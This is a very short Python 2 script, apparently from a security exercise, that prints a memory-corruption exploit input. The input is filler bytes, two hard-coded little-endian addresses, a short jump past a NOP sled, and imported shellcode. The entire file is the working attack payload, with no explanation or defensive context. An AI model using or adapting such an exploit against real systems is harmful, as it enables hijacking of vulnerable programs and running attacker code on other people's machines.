from shellcode import shellcode
from struct import pack
print '\x61'+'\n' + '\x61'*40 + pack("<I",0x80f3780) + pack("<I",0xbffedf5c) + '\n' +'\xeb'+ '\x06' + '\x90'*6 + shellcode
